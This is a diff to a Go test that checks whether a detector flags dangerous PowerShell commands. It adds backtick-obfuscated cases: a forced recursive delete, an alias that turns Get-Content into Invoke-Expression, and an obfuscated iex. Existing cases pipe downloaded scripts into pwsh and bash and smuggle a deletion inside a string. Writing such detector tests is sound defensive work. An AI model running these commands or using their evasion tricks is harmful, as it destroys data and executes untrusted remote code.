@@ -58,6 +58,9 @@ func TestPowerShellNativeArgumentsRetainDangerousCommands(t *testing.T) {
 		`Write-Output "literal -count=1 $(Remove-Item -Recurse target)"`,
 		`curl --retry=2 https://example.invalid/script | pwsh`,
 		`curl --retry=2 https://example.invalid/script | bash`,
+		"Remove-`Item -Recurse -Force C:\\temp",
+		"Set-`Alias Get-Content Invoke-Expression",
+		"i`e`x payload",
 	} {
 		t.Run(command, func(t *testing.T) {
 			if !isDangerousCommandDialect(command, dialectPowerShell) {
